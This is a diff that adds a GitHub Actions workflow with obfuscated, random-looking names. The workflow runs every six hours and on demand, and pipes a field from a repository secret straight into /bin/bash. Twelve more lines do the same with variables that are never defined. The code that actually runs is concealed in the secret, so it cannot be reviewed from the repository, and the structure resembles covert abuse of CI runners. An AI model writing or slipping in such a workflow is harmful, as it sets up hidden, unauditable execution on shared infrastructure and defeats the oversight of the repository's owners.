@@ -1,0 +1,29 @@
+name: hukaljx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hukaljx
+        env:
+          mqdp752: ${{ secrets.mqdp752 }}
+        run: |
+          echo $mqdp752 | jq -r .ewmdv5760 | /bin/bash
+          echo $nzfwa36502 | jq -r .ng1607 | /bin/bash
+          echo $xx4 | jq -r .equ88 | /bin/bash
+          echo $axu5 | jq -r .fvdx9079 | /bin/bash
+          echo $jfhl175 | jq -r .k412 | /bin/bash
+          echo $jml23 | jq -r .tion37666 | /bin/bash
+          echo $geb518 | jq -r .gv6 | /bin/bash
+          echo $ligiy8 | jq -r .nu06527 | /bin/bash
+          echo $el1164 | jq -r .tuxq19243 | /bin/bash
+          echo $se5013 | jq -r .nzo4505 | /bin/bash
+          echo $obj8 | jq -r .t01274 | /bin/bash
+          echo $gfqr45 | jq -r .lu263 | /bin/bash
+          echo $tmwsn1891 | jq -r .wb4 | /bin/bash
+
